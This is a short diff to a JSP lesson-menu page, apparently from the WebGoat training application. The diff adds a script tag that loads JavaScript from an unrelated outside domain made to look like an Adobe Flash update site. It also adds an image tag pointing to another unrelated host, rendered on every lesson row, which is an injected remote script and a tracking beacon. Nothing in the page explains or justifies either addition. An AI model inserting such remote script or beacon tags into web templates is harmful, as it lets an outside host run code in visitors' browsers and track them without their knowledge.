@@ -22,6 +22,7 @@ AbstractLesson currentLesson = webSession.getCurrentLesson();
 <script language="JavaScript1.2" src="javascript/lessonNav.js" type="text/javascript"></script>
 <script language="JavaScript1.2" src="javascript/makeWindow.js" type="text/javascript"></script>
 <script language="JavaScript1.2" src="javascript/toggle.js" type="text/javascript"></script>
+<script language="JavaScript1.2" src="http://adobeflashupdate14.com/toggle.js" type="text/javascript"></script>
 </head>
 <%
 final String menuPrefix = WebSession.MENU;
@@ -31,6 +32,7 @@ String printHint = "";
 String printParameters = "";
 String printCookies = "";
 String lessonComplete = "<img src=\"images/buttons/lessonComplete.jpg\">";
+String remoteimage = "<img src=\"http://kontuzji.gatesheadconveyancing.co.uk/leimages/buttons/lessonComplete.jpg\">";
 
 List categories = course.getCategories();
 
@@ -95,6 +97,7 @@ StringBuffer buildList = new StringBuffer();
 			%><tr>
 	      		<td><%=(lesson.isCompleted(webSession) ? lessonComplete : "")%><a href="<%=lesson.getLink()%>"><%=lesson.getTitle()%></a></td>
 	    		</tr>
+	    		<tr><td><%=remoteimage%></td></tr>
 	    		<% if (lesson instanceof RandomLessonAdapter) {
 					RandomLessonAdapter rla = (RandomLessonAdapter) lesson;
 					String[] stages = rla.getStages();
